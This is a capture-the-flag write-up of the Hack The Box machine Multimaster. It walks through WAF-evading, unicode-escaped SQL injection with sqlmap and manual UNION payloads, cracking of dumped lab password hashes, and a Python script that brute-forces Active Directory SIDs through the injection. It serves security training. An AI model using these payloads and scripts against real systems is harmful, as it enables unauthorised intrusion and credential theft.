---
title: HTB: Multimaster
url: https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html
date: 2020-09-19T13:45:01+00:00
difficulty: Insane [50]
os: Windows
tags: htb-multimaster, ctf, hackthebox, nmap, wfuzz, waf, filter, unicode, sqlmap, tamper, hashcat, crackmapexec, cyberchef, python, sqli, injection, windows, mssql, rid, evil-winrm, cef-debugging, reverse-engineering, bloodhound, amsi, powersploit, as-rep-roast, server-operators, service, service-hijack, sebackupprivilege, serestoreprivilege, robocopy, cve-2020-1472, zerologon, htb-forest, osep-like, oscp-plus-v3
---

![Multimaster](https://0xdfimages.gitlab.io/img/multimaster-cover.png)

Multimaster was a lot of steps, some of which were quite difficult. I’ll start by identifying a SQL injection in a website. I’ll have to figure out the WAF and find a way past that, dumping credentials but also writing a script to use MSSQL to enumerate the domain users. To pivot to the second user, I’ll exploit an instance of Visual Studio Code that’s left an open CEF debugging socket open. That user has access to a DLL in the web directory, in which I’ll find more credentials to pivot to another user. This user has GenericWrite privileges on another user, so I’ll abuse that to get a shell. This final user is in the Server Operators group, allowing me to modify services to get a shell as SYSTEM. I’ll show two alternative roots, abusing the last user’s SeBackupPrivilege and SeRestorePrivilege with robotcopy to read the flag, and using ZeroLogon to go right to administrator in one step.

## Box Info

| Name | [Multimaster](https://hackthebox.com/machines/multimaster)  [Multimaster](https://hackthebox.com/machines/multimaster) [Play on HackTheBox](https://hackthebox.com/machines/multimaster) |
| --- | --- |
| Release Date | [07 Mar 2020](https://twitter.com/hackthebox_eu/status/1235919487196712960) |
| Retire Date | 19 Sep 2020 |
| OS | Windows Windows |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Multimaster |
| Radar Graph | Radar chart for Multimaster |
| First Blood User | 17:00:56[haqpl haqpl](https://app.hackthebox.com/users/76469) |
| First Blood Root | 21:32:36[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creators | [MinatoTW MinatoTW](https://app.hackthebox.com/users/8308)  [egre55 egre55](https://app.hackthebox.com/users/1190) |

## Recon

### nmap

`nmap` revealed a bunch of ports, including many typical of a Windows domain controller:

```

PS> nmap -p- --min-rate 10000 -oA .\scans\alltcp 10.10.10.179
Starting Nmap 7.70 ( https://nmap.org ) at 2020-03-30 18:32 GMT Daylight Time
Nmap scan report for 10.10.10.179
Host is up (0.017s latency).
Not shown: 65513 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49676/tcp open  unknown
49693/tcp open  unknown
49745/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.30 seconds

PS> nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV -oA .\scans\tcpscripts 10.10.10.179
Starting Nmap 7.70 ( https://nmap.org ) at 2020-03-30 18:34 GMT Daylight Time
Nmap scan report for 10.10.10.179
Host is up (0.0092s latency).

PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MegaCorp
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-30 17:44:26Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf       .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.70%I=7%D=3/30%Time=5E822DB2%P=i686-pc-windows-windows%r(
SF:DNSVersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07vers
SF:ion\x04bind\0\0\x10\0\x03");
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h29m50s, deviation: 4h02m31s, median: 9m48s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2020-03-30T10:46:41-07:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-03-30 18:46:38
|_  start_date: 2020-03-30 17:04:52

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 182.14 seconds

```

The OS looks like Windows Server 2016.

### SMB - TCP 445

I’m not able to connect to any shares without creds:

```

PS> net view 10.10.10.179
System error 5 has occurred.

Access is denied.

```

### Website - TCP 80

#### Site

The site is the MegaCorp Employee Hub:

![image-20200330164330599](https://0xdfimages.gitlab.io/img/image-20200330164330599.png)

None of the buttons really do anything. The Gallery link goes to some pictures. The Colleague Finder link presents a form:

![image-20200330202803296](https://0xdfimages.gitlab.io/img/image-20200330202803296.png)

If I just hit enter, little red text comes up saying “Required.”, but then all the employees come back anyway:

[![image-20200330202944256](https://0xdfimages.gitlab.io/img/image-20200330202944256.png)](https://0xdfimages.gitlab.io/img/image-20200330202944256.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200330202944256.png)

I’ll start a list of user names.

#### Directory Brute Force

I started a `gobuster` on the site, but after a few requests, everything starts coming back 403. That basically says the WAF is blocking too many requests. I could play with really slowing things down, but at this point, I’ll save that for later.

## Shell as tushikikatomo

### Identify SQLi in Colleague Finder

#### Enumeration

The source for the Colleague Finder page basically just loads JavaScript which I choose not to dive into for now. I can see in Burp that when I submit a string, it sends a request like the following:

```

POST /api/getColleagues HTTP/1.1
Host: 10.10.10.179
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.179/
Content-Type: application/json;charset=utf-8
Content-Length: 11
Connection: close

{"name":""}

```

Given the JSON input, I tried to do some quick NoSQL Injection fuzzing. For example, I tried `{"name":{"$ne":"0xdf"}}`, but it just returned an empty array. After a few more tries, it seems like this isn’t NoSQL injectable.

#### Enumerate WAF

I played with trying to get the App to throw an SQL error but continually ran into the WAF. I started a `wfuzz` to look for banned characters. The first time I ran it, everything was banned:

```

root@kali# wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d '{"name":"FUZZ"}' -H 'Content-Type: application/json;charset=utf-8' -t 1              
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.179/api/getColleagues
Total requests: 32

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000001:   403        29 L     92 W     1233 Ch     "~"
000000002:   403        29 L     92 W     1233 Ch     "!"
000000003:   403        29 L     92 W     1233 Ch     "@"
000000004:   403        29 L     92 W     1233 Ch     "#"
000000005:   403        29 L     92 W     1233 Ch     "$"
000000006:   403        29 L     92 W     1233 Ch     "%"
000000007:   403        29 L     92 W     1233 Ch     "^"
000000008:   403        29 L     92 W     1233 Ch     "&"
000000009:   403        29 L     92 W     1233 Ch     "*"
000000010:   403        29 L     92 W     1233 Ch     "("
000000011:   403        29 L     92 W     1233 Ch     ")"
000000012:   403        29 L     92 W     1233 Ch     "_"
000000013:   403        29 L     92 W     1233 Ch     "_"
000000014:   403        29 L     92 W     1233 Ch     "+"
000000015:   403        29 L     92 W     1233 Ch     "="
000000016:   403        29 L     92 W     1233 Ch     "{"
000000017:   403        29 L     92 W     1233 Ch     "}"
000000018:   403        29 L     92 W     1233 Ch     "]"
000000019:   403        29 L     92 W     1233 Ch     "["
000000020:   403        29 L     92 W     1233 Ch     "|"
000000021:   403        29 L     92 W     1233 Ch     "\"
000000022:   403        29 L     92 W     1233 Ch     "`"
000000023:   403        29 L     92 W     1233 Ch     ","
000000024:   403        29 L     92 W     1233 Ch     "."
000000025:   403        29 L     92 W     1233 Ch     "/"
000000026:   403        29 L     92 W     1233 Ch     "?"
000000027:   403        29 L     92 W     1233 Ch     ";"
000000028:   403        29 L     92 W     1233 Ch     ":"
000000029:   403        29 L     92 W     1233 Ch     "'"
000000030:   403        29 L     92 W     1233 Ch     """
000000031:   403        29 L     92 W     1233 Ch     "<"
000000032:   403        29 L     92 W     1233 Ch     ">"

Total time: 0.436510                                       
Processed Requests: 32                                     
Filtered Requests: 0                                       
Requests/sec.: 73.30872 

```

That seemed unlikely, so I found the parameter `-t` which is the number of concurrent connections. I ran it again with `-t 1`, and I’ll also hide the 200 responses:

```

root@kali# wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d '{"name":"FUZZ"}' -H 'Content-Type: application/json;charset=utf-8' -t 1 --hc 200
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.179/api/getColleagues
Total requests: 32

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000004:   403        29 L     92 W     1233 Ch     "#"
000000021:   500        0 L      4 W      36 Ch       "\"
000000029:   403        29 L     92 W     1233 Ch     "'"
000000030:   500        0 L      4 W      36 Ch       """
000000031:   403        29 L     92 W     1233 Ch     "<"
000000032:   403        29 L     92 W     1233 Ch     ">"

Total time: 0.537886
Processed Requests: 32
Filtered Requests: 26
Requests/sec.: 59.49209

```

So the banned characters are at least `#'<>`, and `"` breaks things because its double quotes already and `\` is the escape character.

#### Unicode

To get `wfuzz` working, I had to add the header for `Content-Type`. I just grabbed it out of the request I had from Burp, but I noticed it specifically called out the `charset=utf-8`. I looked up the character `'`, and it’s ASCII hex value is 0x27. So I sent the name `\u27`, and got back and error:

![image-20200330205309230](https://0xdfimages.gitlab.io/img/image-20200330205309230.png)

That is a good sign there’s SQL injection, even if blind.

### Database Dump

Rather than do this manually (way too much encoding), I’ll turn to `sqlmap`. I’ll right click on the request in Burp and select “Copy to file”, saving it as `colleagues.request`. I’ll need some features:
- The `charunicodeescape` [tamper plugin](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/charunicodeescape.py) will unicode encode all the characters in the payload. This will avoid the WAF checking for bad characters.
- `--delay 5` will slow down the process to one request every 5 seconds. It may have been able to go faster, but I was walking away for a bit, so I left it with this. I added `--proxy` so that I could see that requests were still going through Burp when it looks frozen.
- `--level 5 --risk 3` turns up the things it’s willing to try to the max. `--batch` will take the default answer to any prompts.

```

root@kali# sqlmap -r colleagues.request --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.3#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org
...[snip]...
[*] starting @ 18:08:31 /2020-03-30/

[18:08:31] [INFO] parsing HTTP request from 'colleagues.request'
[18:08:31] [INFO] loading tamper module 'charunicodeescape'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
...[snip]...
[18:31:01] [INFO] (custom) POST parameter 'JSON name' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[18:31:01] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
(custom) POST parameter 'JSON name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 258 HTTP(s) requests:
---                                                        
Parameter: JSON name ((custom) POST)                       
    Type: boolean-based blind                              
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: {"name":"test' OR NOT 3782=3782-- bJBd"}

    Type: stacked queries                                  
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: {"name":"test';WAITFOR DELAY '0:0:5'--"}

    Type: time-based blind                                 
    Title: Microsoft SQL Server/Sybase time-based blind (IF)                                                          
    Payload: {"name":"test' WAITFOR DELAY '0:0:5'-- FvDZ"}

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: {"name":"test' UNION ALL SELECT 58,58,58,CHAR(113)+CHAR(112)+CHAR(122)+CHAR(107)+CHAR(113)+CHAR(68)+CHAR(105)+CHAR(69)+CHAR(119)+CHAR(71)+CHAR(98)+CHAR(76)+CHAR(83)+CHAR(102)+CHAR(68)+CHAR(114)+CHAR(73)+CHAR(109)+CHAR(73)+CH
AR(98)+CHAR(101)+CHAR(116)+CHAR(99)+CHAR(70)+CHAR(80)+CHAR(103)+CHAR(101)+CHAR(86)+CHAR(113)+CHAR(73)+CHAR(82)+CHAR(103)+CHAR(90)+CHAR(115)+CHAR(114)+CHAR(76)+CHAR(73)+CHAR(77)+CHAR(105)+CHAR(103)+CHAR(73)+CHAR(71)+CHAR(67)+CHAR(83)+CHAR
(111)+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(98)+CHAR(113),58-- gxQm"}
---
[18:31:01] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[18:31:02] [INFO] testing Microsoft SQL Server
[18:31:07] [INFO] confirming Microsoft SQL Server
[18:31:22] [INFO] the back-end DBMS is Microsoft SQL Server
back-end DBMS: Microsoft SQL Server 2017                   
[18:31:22] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.179' 

```

With that success, now I can run with `--dbs` to list the databases. There are five:

```

root@kali# sqlmap -r colleagues.request --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080 --dbs
...[snip]...
[21:19:29] [INFO] fetching database names
available databases [5]:
[*] Hub_DB
[*] master
[*] model
[*] msdb
[*] tempdb

```

I could next list the tables, but I actually went the more “nuke it from space” route, and ran `--dump-all` and `--exclude-sysdbs`:

```

root@kali# sqlmap -r colleagues.request --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080 --dump-all --exclude-sysdbs
...[snip]...
[18:51:58] [INFO] the back-end DBMS is Microsoft SQL Server
back-end DBMS: Microsoft SQL Server 2017                   
[18:51:58] [INFO] sqlmap will dump entries of all tables from all databases now
[18:51:58] [INFO] fetching database names                  
[18:52:08] [INFO] fetching tables for databases: Hub_DB, master, model, msdb, tempdb
[18:52:08] [INFO] skipping system database 'master'
[18:52:08] [INFO] skipping system database 'model'
[18:52:08] [INFO] skipping system database 'msdb'
[18:52:08] [INFO] skipping system database 'tempdb'
[18:52:08] [INFO] fetching columns for table 'Colleagues' in database 'Hub_DB'
[18:52:18] [INFO] fetching entries for table 'Colleagues' in database 'Hub_DB'
Database: Hub_DB                                           
Table: Colleagues                                          
[17 entries]                                               
+------+----------------------+-------------+----------------------+----------------------+
| id   | email                | image       | name                 | position             |
+------+----------------------+-------------+----------------------+----------------------+
| 1    | sbauer@megacorp.htb  | sbauer.jpg  | Sarina Bauer         | Junior Developer     |
| 2    | okent@megacorp.htb   | okent.jpg   | Octavia Kent         | Senior Consultant    |
| 3    | ckane@megacorp.htb   | ckane.jpg   | Christian Kane       | Assistant Manager    |
| 4    | kpage@megacorp.htb   | kpage.jpg   | Kimberly Page        | Financial Analyst    |
| 5    | shayna@megacorp.htb  | shayna.jpg  | Shayna Stafford      | HR Manager           |
| 6    | james@megacorp.htb   | james.jpg   | James Houston        | QA Lead              |
| 7    | cyork@megacorp.htb   | cyork.jpg   | Connor York          | Web Developer        |
| 8    | rmartin@megacorp.htb | rmartin.jpg | Reya Martin          | Tech Support         |
| 9    | zac@magacorp.htb     | zac.jpg     | Zac Curtis           | Junior Analyst       |
| 10   | jorden@megacorp.htb  | jorden.jpg  | Jorden Mclean        | Full-Stack Developer |
| 11   | alyx@megacorp.htb    | alyx.jpg    | Alyx Walters         | Automation Engineer  |
| 12   | ilee@megacorp.htb    | ilee.jpg    | Ian Lee              | Internal Auditor     |
| 13   | nbourne@megacorp.htb | nbourne.jpg | Nikola Bourne        | Head of Accounts     |
| 14   | zpowers@megacorp.htb | zpowers.jpg | Zachery Powers       | Credit Analyst       |
| 15   | aldom@megacorp.htb   | aldom.jpg   | Alessandro Dominguez | Senior Web Developer |
| 16   | minato@megacorp.htb  | minato.jpg  | MinatoTW             | CEO                  |
| 17   | egre55@megacorp.htb  | egre55.jpg  | egre55               | CEO                  |
+------+----------------------+-------------+----------------------+----------------------+

[18:52:23] [INFO] table 'Hub_DB.dbo.Colleagues' dumped to CSV file '/root/.sqlmap/output/10.10.10.179/dump/Hub_DB/Colleagues.csv'
[18:52:23] [INFO] fetching columns for table 'Logins' in database 'Hub_DB'
[18:52:33] [INFO] fetching entries for table 'Logins' in database 'Hub_DB'
[18:52:38] [INFO] recognized possible password hashes in column '[password]'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[18:52:38] [INFO] using hash method 'sha384_generic_passwd'
what dictionary do you want to use?                        
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file                                 
[3] file with list of dictionary files                     
> 1                                                        
[18:52:38] [INFO] using default dictionary                 
do you want to use common password suffixes? (slow!) [y/N] N
[18:52:38] [INFO] starting dictionary-based cracking (sha384_generic_passwd)
[18:52:38] [INFO] starting 3 processes                     
[18:52:50] [WARNING] no clear password(s) found
Database: Hub_DB 
Table: Logins                                              
[17 entries]
+------+----------+--------------------------------------------------------------------------------------------------+
| id   | username | password                                                                                         |
+------+----------+--------------------------------------------------------------------------------------------------+
| 1    | sbauer   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 2    | okent    | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
| 3    | ckane    | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 4    | kpage    | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 5    | shayna   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 6    | james    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 7    | cyork    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 8    | rmartin  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
| 9    | zac      | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 10   | jorden   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 11   | alyx     | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
| 12   | ilee     | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 13   | nbourne  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
| 14   | zpowers  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 15   | aldom    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 16   | minatotw | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc |
| 17   | egre55   | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc |
+------+----------+--------------------------------------------------------------------------------------------------+

[18:52:50] [INFO] table 'Hub_DB.dbo.Logins' dumped to CSV file '/root/.sqlmap/output/10.10.10.179/dump/Hub_DB/Logins.csv'
[18:52:50] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.179' 

```

Now I’ve got usernames and password hashes.

### Crack Hashes

The `sqlmap` automated cracker didn’t break any of the hashes, but it uses a limited wordlist. Given the length of the hash, it looks like SHA-384. When I ran `hashcat` with `-m 10800` for SHA-384 with `rockyou.txt`, nothing broke. There’s two other formats on the [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page - SHA3-384 (`-m 17500`) and Keccak-384 (`-m 17900`). When I ran with the latter, I got results:

```

root@kali# hashcat -m 17900 hashes /usr/share/wordlists/rockyou.txt --force
hashcat (v5.1.0) starting...
...[snip]...
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
Approaching final keyspace - workload adjusted.  
...[snip]...

```

While there’s a bunch of users in the database, there were only four unique passwords, and three broke with `rockyou.txt`:

| Password | Users |
| --- | --- |
| password1 | sbauer, shayna, james, cyork, jorden, aldom |
| finance1 | ckane, kpage, zac, ilee, zpowers |
| banking1 | okent, rmartin, alyx, nbourne |
| ? | minatotw, egre55 |

### Test Creds

I used `crackmapexec` to see if I could use any of these creds over SMB, but they all failed:

```

root@kali# crackmapexec smb 10.10.10.179 -u users -p passwords
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\sbauer:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\sbauer:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\sbauer:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\okent:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\okent:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\okent:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\ckane:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\ckane:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\ckane:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\kpage:password1 STATUS_LOGON_FAILURE 
...[snip]...

```

### Dump Domain Users

A bit stuck, I eventually turned back to the database and [this article](https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/) on how to dump domain users from MSSQL. It shows how to do it through intended interactions with the database, and at the very end through Metasploit / SQLi.

#### Back to Manual

Given that I’m going into new territory, I decided to go back to manual SQLi at this point. I have the example query from `sqlmap` for UNION 5 columns:

```

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: {"name":"test' UNION ALL SELECT 58,58,58,CHAR(113)+CHAR(112)+CHAR(122)+CHAR(107)+CHAR(113)+CHAR(68)+CHAR(105)+CHAR(69)+CHAR(119)+CHAR(71)+CHAR(98)+CHAR(76)+CHAR(83)+CHAR(102)+CHAR(68)+CHAR(114)+CHAR(73)+CHAR(109)+CHAR(73)+CHAR(98)+CHAR(101)+CHAR(116)+CHAR(99)+CHAR(70)+CHAR(80)+CHAR(103)+CHAR(101)+CHAR(86)+CHAR(113)+CHAR(73)+CHAR(82)+CHAR(103)+CHAR(90)+CHAR(115)+CHAR(114)+CHAR(76)+CHAR(73)+CHAR(77)+CHAR(105)+CHAR(103)+CHAR(73)+CHAR(71)+CHAR(67)+CHAR(83)+CHAR(111)+CHAR(113)+CHAR(98)+CHAR(120)+CHAR(98)+CHAR(113),58-- gxQm"}

```

If I look at that query, it’s clearly putting 58 into columns 1, 2, 3, and 5, and then some long string in column 4.

There’s also this warning:

```

[WARNING] changes made by tampering scripts are not included in shown payload content(s)

```

The easiest place I found to work was [CyberChef](https://gchq.github.io/CyberChef/), where I could use the Escape Unicode Characters recipe, and then just update the input and copy out the result:

![image-20200331063716896](https://0xdfimages.gitlab.io/img/image-20200331063716896.png)

Throwing that into Repeater, the injection works:

![image-20200331063743518](https://0xdfimages.gitlab.io/img/image-20200331063743518.png)

I can see the static string in the `email field`.

#### Get Default Domain

First step is to get the domain name with `SELECT DEFAULT_DOMAIN()`. I can just replace all the static `CHAR` with that query to get:

```

test' UNION ALL SELECT 58,58,58,DEFAULT_DOMAIN(),58-- gxQm

```

Which encodes to:

```

\u0074\u0065\u0073\u0074\u0027\u0020\u0055\u004E\u0049\u004F\u004E\u0020\u0041\u004C\u004C\u0020\u0053\u0045\u004C\u0045\u0043\u0054\u0020\u0035\u0038\u002C\u0035\u0038\u002C\u0035\u0038\u002C\u0044\u0045\u0046\u0041\u0055\u004C\u0054\u005F\u0044\u004F\u004D\u0041\u0049\u004E\u0028\u0029\u002C\u0035\u0038\u002D\u002D\u0020\u0067\u0078\u0051\u006D

```

Which returns MEGACORP:

![image-20200331064000628](https://0xdfimages.gitlab.io/img/image-20200331064000628.png)

#### Get a Domain RID

Now I need to get a domain RID using the `SUSER_SID` function on a known group (I’ll use `MEGACORP/Domain Admins`):

```

test' UNION ALL SELECT 58,58,58,SUSER_SID('MEGACORP\Domain Admins'),58-- gxQm

```

Returns a result, but it’s a funky encoding because it’s being interpreted as a string:

![image-20200331064533176](https://0xdfimages.gitlab.io/img/image-20200331064533176.png)

The article shows a nice hex number coming back, not that garbage. On [StackOverflow](https://stackoverflow.com/questions/703019/convert-integer-to-hex-and-hex-to-integer) I found how I could convert this to hex in the query:

```

test' UNION ALL SELECT 58,58,58,master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins')),58-- gxQm

```

And it works:

![image-20200331064726245](https://0xdfimages.gitlab.io/img/image-20200331064726245.png)

The RID is `0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000`, which makes the domain SID `0x0105000000000005150000001c00d1bcd181f1492bdfc236`.

#### Build a User RID

I know the default administrator is RID 500. So I can make this RID by taking 500, converting to hex (0x1f4), padding it to 4 bytes (0x000001f4), and reversing the byte order (0xf4010000). So the administrator RID should be `0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000`. To check, I’ll run `SUSER_SNAME`:

```

test' UNION ALL SELECT 58,58,58,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000),58-- gxQm

```

Results in:

![image-20200331065317670](https://0xdfimages.gitlab.io/img/image-20200331065317670.png)

It worked!

#### Script Brute Force

I’ll need a script to brute force across the possible SIDs that could be in use by users. What I came up with was this:

```

#!/usr/bin/env python3

import binascii
import requests
import struct
import sys
import time

payload_template = """test' UNION ALL SELECT 58,58,58,{},58-- -"""

def unicode_escape(s):
    return "".join([r"\u{:04x}".format(ord(c)) for c in s])

def issue_query(sql):
    while True:
        resp = requests.post(
            "http://10.10.10.179/api/getColleagues",
            data='{"name":"' + unicode_escape(payload_template.format(sql)) + '"}',
            headers={"Content-type": "text/json; charset=utf-8"},
            proxies={"http": "http://127.0.0.1:8080"},
        )
        if resp.status_code != 403:
            break
        sys.stdout.write("\r[-] Triggered WAF. Sleeping for 30 seconds")
        time.sleep(30)
    return resp.json()[0]["email"]

print("[*] Finding domain")
domain = issue_query("DEFAULT_DOMAIN()")
print(f"[+] Found domain: {domain}")

print("[*] Finding Domain SID")
sid = issue_query(f"master.dbo.fn_varbintohexstr(SUSER_SID('{domain}\Domain Admins'))")[:-8]
print(f"[+] Found SID for {domain} domain: {sid}")

for i in range(500, 10500):
    sys.stdout.write(f"\r[*] Checking SID {i}" + " " * 50)
    num = binascii.hexlify(struct.pack("<I", i)).decode()
    acct = issue_query(f"SUSER_SNAME({sid}{num})")
    if acct:
        print(f"\r[+] Found account [{i:05d}]  {acct}" + " " * 30)
    time.sleep(1)

